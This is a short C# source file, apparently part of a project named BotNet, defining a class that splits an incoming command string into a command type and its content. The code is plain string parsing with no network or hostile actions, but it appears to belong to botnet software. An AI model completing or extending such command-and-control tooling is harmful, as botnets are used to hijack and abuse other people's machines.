using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace BotNet
{
    class cmd
    {
        public string ComType { get; private set; }
        public string ComContent { get; private set; }

        public cmd(string imput_content)
        {
            string[] cmd_cnt = Regex.Split(imput_content, Configs.spliter);

            ComType = cmd_cnt[0];
            ComContent = cmd_cnt[1];
        }
    }
}
